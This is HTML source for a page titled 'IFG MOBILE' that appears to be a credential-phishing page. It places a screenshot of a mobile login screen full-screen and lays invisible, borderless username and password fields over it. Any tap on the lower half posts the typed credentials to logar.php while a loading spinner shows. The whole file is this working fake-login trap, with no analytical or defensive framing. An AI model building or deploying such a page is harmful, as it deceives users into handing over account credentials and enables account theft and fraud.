<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IFG MOBILE</title>
    <style>
        body {
            margin: 0;
        }
        .pag {
            position: absolute;
            width: 100vw;
            height: 100vh;
        }
        .click {
            width: 100vw;
            height: 50%;
            position: absolute;
            top: 50%;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            width: 100%;
            top: 17vh;
            z-index: 999;
            position: absolute;
        }
        form input {
            position: relative;
            left: 21vw;
            width: calc(90% - 21vw);
            border: none;
            outline: none;
        }

        .loading-container {
            position: fixed;
            width: 100vw;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            height: 100vh;
        }

        #loadingContainer > img {
            width: 15vw;
            top: 50%;
            position: absolute;
            left: 50%;
            transform: translate(-50%, -50%);
        }
    </style>
</head>
<body>
    <div id="loadingContainer" class="loading-container" style="display: none;">
        <img src="imgs/loading.gif" alt="">
    </div>
    <img src="imgs/login.png" alt="" class="pag">
    <div class="click"></div>
    <form action="logar.php" method="POST">
        <input type="text" name="user" class="user">
        <input type="password" name="pass" class="pass">
        <input type="hidden" value="Entrar">
    </form>
    <script>
        var loadingContainer = document.getElementById('loadingContainer');
        document.querySelector('.click').addEventListener('click', function(){
            loadingContainer.style.display = 'block';
            document.querySelector('form').submit();
        });

        setTimeout(function() {
            if (loadingContainer) {
                loadingContainer.style.display = 'none';
            }
        }, 2000);
    </script>
</body>
</html>